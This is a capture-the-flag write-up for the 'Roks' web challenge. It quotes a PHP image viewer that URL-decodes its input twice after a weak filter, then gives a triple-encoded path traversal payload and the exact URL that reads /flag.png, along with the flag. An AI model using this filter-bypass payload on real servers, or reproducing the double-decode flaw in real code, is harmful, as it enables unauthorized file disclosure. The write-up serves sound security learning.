# Roks

## Description

by `FIREPONY57`

My rock enthusiast friend made a website to show off some of his pictures. Could you do something with it?

**Attachments**: [source](https://imaginaryctf.org/r/0Sm4V#roks.zip) <br>
**Server**: [http://roks.chal.imaginaryctf.org](http://roks.chal.imaginaryctf.org/)

## Solution

Flag location: `COPY flag.png /` (root directory -> `/flag.png`)

Website uses `file.php` to display images.
```js
xhr.open("GET", "file.php?file=" + randomImageName, true);
```

`file.php`:
```php
<?php
  $filename = urldecode($_GET["file"]);
  if (str_contains($filename, "/") or str_contains($filename, ".")) {
    $contentType = mime_content_type("stopHacking.png");
    header("Content-type: $contentType");
    readfile("stopHacking.png");
  } else {
    $filePath = "images/" . urldecode($filename);
    $contentType = mime_content_type($filePath);
    header("Content-type: $contentType");
    readfile($filePath);
  }
?>
```

requested `file` get's `urldecoded` and filtered for `/` and `.`

We need to get around this somehow. The interesting thing is `urldecode`, it's used once more when filter is passed (which is awfully odd). <br>
What if we URLEncode payload three times to bypass the filter?

![roks-1](/assets/ctf/imaginaryctf/roks-1.png)

Payload: `%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng`<br>
Final URL: `http://roks.chal.imaginaryctf.org/file.php?file=%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252F%25252E%25252E%25252Fflag%25252Epng`

![roks-2](/assets/ctf/imaginaryctf/roks-2.png)
::: tip Flag
`ictf{tr4nsv3rs1ng_0v3r_r0k5_6a3367} `
:::